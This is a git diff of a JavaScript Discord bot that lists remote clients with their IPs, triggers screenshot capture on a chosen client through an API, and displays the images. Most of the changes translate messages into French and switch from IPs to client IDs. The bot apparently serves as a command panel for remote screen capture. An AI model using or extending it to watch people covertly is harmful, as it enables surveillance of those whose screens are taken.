@@ -8,7 +8,7 @@ const { TOKEN, API_BASE_URL } = config;
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 client.on('ready', () => {
-    console.log(`Logged in as ${client.user.tag}!`);
+    console.log(`Connecté en tant que ${client.user.tag}!`);
     client.user.setActivity('/help');
 });
 
@@ -16,7 +16,7 @@ const handleHelpCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
     const embed = new EmbedBuilder()
         .setTitle('Help')
-        .setDescription('Here are the available commands:')
+        .setDescription('Voici la liste des commandes disponibles :')
         .addFields(commands.map(command => ({
             name: `/${command.name}`,
             value: command.description,
@@ -26,19 +26,15 @@ const handleHelpCommand = async (interaction) => {
 };
 
 const handleScreenshotCommand = async (interaction) => {
-    const ip = interaction.options.getString('ip');
+    const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ ephemeral: true });
-    axios.post(`${API_BASE_URL}/command`, { command: 'screenshot', ip: ip })
+    axios.post(`${API_BASE_URL}/command/${clientId}`, { command: 'screenshot' })
         .then(response => {
-            if (response.data.status === 'error') {
-                interaction.editReply(`${response.data.message}`);
-            }else{
-                interaction.editReply(`Screenshot command sent to client with **IP: ${ip}**`);
-            }
+            interaction.editReply(`${response.data.message}`);
         })
         .catch(error => {
-            console.error("Error sending the command", error);
-            interaction.editReply("Error sending the command.");
+            console.error("Erreur lors de l'envoi de la commande", error);
+            interaction.editReply("Erreur lors de l'envoi de la commande.");
         });
 };
 
@@ -53,19 +49,20 @@ const handleClientsCommand = async (interaction) => {
         const clients = response.data.clients;
 
         if (clients.length === 0) {
-            await interaction.editReply("No clients available based on the selected filter.");
+            await interaction.editReply("Aucun client disponible.");
             return;
         }
 
         if (statusFilter) {
             const color = statusFilter === 'online' ? '#00FF00' : '#FF0000';
+            const status = statusFilter === 'online' ? 'EN LIGNE' : 'HORS LIGNE';
             const embed = new EmbedBuilder()
-                .setTitle(`Clients ${statusFilter.toUpperCase()}`)
+                .setTitle(`Clients ${status}`)
                 .setDescription(clients.map(client =>
-                    `**${client.name || 'Unnamed client'}**\n
+                    `**${client.name || 'Client sans nom'}**\n
                     **IP :** ${client.ip}
-                    **Created At :** ${client.date_created}
-                    **Updated At :** ${client.date_updated}`
+                    **Créé le :** ${client.date_created}
+                    **Mis à jour le :** ${client.date_updated}`
                 ).join('\n\n'))
                 .setColor(color)
                 .setTimestamp();
@@ -79,12 +76,12 @@ const handleClientsCommand = async (interaction) => {
 
             if (onlineClients.length > 0) {
                 embeds.push(new EmbedBuilder()
-                    .setTitle('Clients ONLINE')
+                    .setTitle('Clients EN LIGNE')
                     .setDescription(onlineClients.map(client =>
-                        `**${client.name || 'Unnamed client'}**\n
+                        `**${client.name || 'Client sans nom'}**\n
                         **IP :** ${client.ip}
-                        **Created At :** ${client.date_created}
-                        **Updated At :** ${client.date_updated}`
+                        **Créé le :** ${client.date_created}
+                        **Mis à jour le :** ${client.date_updated}`
                     ).join('\n\n'))
                     .setColor('#00FF00')
                     .setTimestamp());
@@ -92,12 +89,12 @@ const handleClientsCommand = async (interaction) => {
 
             if (offlineClients.length > 0) {
                 embeds.push(new EmbedBuilder()
-                    .setTitle('Clients OFFLINE')
+                    .setTitle('Clients HORS LIGNE')
                     .setDescription(offlineClients.map(client =>
-                        `**${client.name || 'Unnamed client'}**\n
+                        `**${client.name || 'Client sans nom'}**\n
                         **IP :** ${client.ip}
-                        **Created At :** ${client.date_created}
-                        **Updated At :** ${client.date_updated}`
+                        **Créé le :** ${client.date_created}
+                        **Mis à jour le :** ${client.date_updated}`
                     ).join('\n\n'))
                     .setColor('#FF0000')
                     .setTimestamp());
@@ -106,43 +103,45 @@ const handleClientsCommand = async (interaction) => {
             await interaction.editReply({ embeds: embeds });
         }
     } catch (error) {
-        console.error("Error retrieving clients", error);
-        await interaction.editReply("An error occurred while retrieving clients.");
+        console.error("Erreur lors de la récupération des clients", error);
+        await interaction.editReply("Erreur lors de la récupération des clients.");
     }
 };
 
 const handleStopCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
-    await interaction.editReply('Stopping the bot...');
+    await interaction.editReply('Arrêt du bot...');
     process.exit(0);
 };
 
 const handleListAllScreenshotsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
-    axios.get(`${API_BASE_URL}/screenshot`)
+    axios.get(`${API_BASE_URL}/clients`)
         .then(response => {
-            const screenshots = response.data.screenshots;
-            if (!screenshots || Object.keys(screenshots).length === 0) {
-                interaction.editReply("No screenshots available.");
+            const clients = response.data.clients;
+            if (clients.length === 0) {
+                interaction.editReply("Aucun client disponible.");
                 return;
             }
 
-            const uniqueIps = Object.keys(screenshots);
-            const buttons = uniqueIps.slice(0, 5).map(ip =>
-                new ButtonBuilder().setCustomId(`ip_${ip}`).setLabel(ip).setStyle(1));
+            const buttons = clients.map(client =>
+                new ButtonBuilder()
+                    .setCustomId(`client_${client.id}`)
+                    .setLabel(`${client.name || 'Client sans nom'} / ${client.ip}`)
+                    .setStyle(1)
+            );
 
-            if (buttons.length > 0) {
-                const row = new ActionRowBuilder().addComponents(...buttons);
-                interaction.editReply({ content: "Select an IP to view screenshots:", components: [row] });
-            } else {
-                interaction.editReply("Error: No valid IPs found.");
-            }
+            // Création des lignes d'actions avec 5 boutons maximum par ligne (limite Discord)
+            const components = buttons.slice(0, 5).map(button => new ActionRowBuilder().addComponents(button));
+
+            interaction.editReply({ content: "Selectionnez un client pour voir les captures d'écran :", components });
         })
         .catch(error => {
-            console.error("Error retrieving screenshots", error);
-            interaction.editReply("Error retrieving screenshots.");
+            console.error("Erreur lors de la récupération des clients", error);
+            interaction.editReply("Erreur lors de la récupération des clients.");
         });
 };
+
 
 client.on('interactionCreate', async interaction => {
     if (interaction.isChatInputCommand()) {
@@ -164,61 +163,66 @@ client.on('interactionCreate', async interaction => {
                 break;
         }
     } else if (interaction.isButton()) {
-        const ip = interaction.customId.split('_')[1];
-        axios.get(`${API_BASE_URL}/screenshot/${ip}`)
+        const clientId = interaction.customId.split('_')[1];
+        axios.get(`${API_BASE_URL}/screenshot/client/${clientId}`)
             .then(response => {
                 const screenshots = response.data.screenshots;
                 if (screenshots.length === 0) {
-                    interaction.update({ content: "No screenshots available for this IP.", components: [] });
+                    interaction.update("Aucune capture d'écran disponible pour ce client.");
                     return;
                 }
 
-                const options = screenshots.map((s, index) => ({
-                    label: `Screenshot ${index + 1}`,
-                    description: s.substring(0, 100),
-                    value: s,
+                const options = screenshots.map(screenshot => ({
+                    label: `Capture d\'écran ${screenshot.id}`,
+                    description: `Le ${screenshot.date_created}`,
+                    value: screenshot.id.toString(),
                 }));
 
                 const selectMenu = new StringSelectMenuBuilder()
-                    .setCustomId('select_screenshot')
-                    .setPlaceholder('Select a screenshot')
-                    .addOptions(options);
+                    .setCustomId("select_screenshot")
+                    .setPlaceholder("Selectionnez une capture d'écran")
+                    .addOptions(options.slice(0, 25)); // Discord limit of 25 options
 
                 const row = new ActionRowBuilder().addComponents(selectMenu);
 
-                interaction.update({ content: `Select a screenshot for IP: ${ip}`, components: [row] });
+                interaction.update({ content: "Selectionnez une capture d'écran :", components: [row] });
             })
             .catch(error => {
-                console.error("Error retrieving screenshots for IP", error);
-                interaction.update({ content: "Error retrieving screenshots for this IP.", components: [] });
+                console.error("Erreur lors de la récupération des captures d'écran pour ce client", error);
+                interaction.update({ content: "Erreur lors de la récupération des captures d'écran pour ce client." });
             });
-    }else if (interaction.isStringSelectMenu()) {
-        if (interaction.customId === 'select_screenshot') {
-            const screenshotIdentifier = interaction.values[0].substring(11);
-            const imageUrl = `${API_BASE_URL}/screenshot/${screenshotIdentifier}`;
-            axios.get(imageUrl, { responseType: 'arraybuffer' })
-                .then(response => {
-                    const imageBuffer = response.data;
-                    const attachment = new AttachmentBuilder(imageBuffer, { name: 'screenshot.png' });
+        } else if (interaction.customId === "select_screenshot") {
+            const screenshotId = interaction.values[0];
+            axios
+                .get(`${API_BASE_URL}/screenshot/image/${screenshotId}`, {
+                    responseType: "arraybuffer",
+                })
+                .then((response) => {
+                    const imageBuffer = Buffer.from(response.data, "binary");
+                    const attachment = new AttachmentBuilder(imageBuffer, {
+                        name: "screenshot.png",
+                    });
 
                     const embed = new EmbedBuilder()
-                        .setTitle('Screenshot')
-                        .setDescription('Here is the requested screenshot:')
-                        .setImage('attachment://screenshot.png');
+                        .setTitle("Capture d'écran")
+                        .setDescription("Voici la capture d'écran :")
+                        .setImage("attachment://screenshot.png");
 
                     interaction.update({
-                        content: 'Here is the screenshot:',
+                        content: "Voici la capture d'écran :",
                         files: [attachment],
                         embeds: [embed],
                         components: [],
                     });
                 })
-                .catch(error => {
-                    console.error("Error retrieving screenshot from API", error);
-                    interaction.update({ content: "Error retrieving screenshot.", components: [] });
+                .catch((error) => {
+                    console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
+                    interaction.update({
+                        content: "Erreur lors de la récupération de l'image de la capture d'écran.",
+                        components: [],
+                    });
                 });
         }
-    }
 });
 
 client.login(TOKEN);
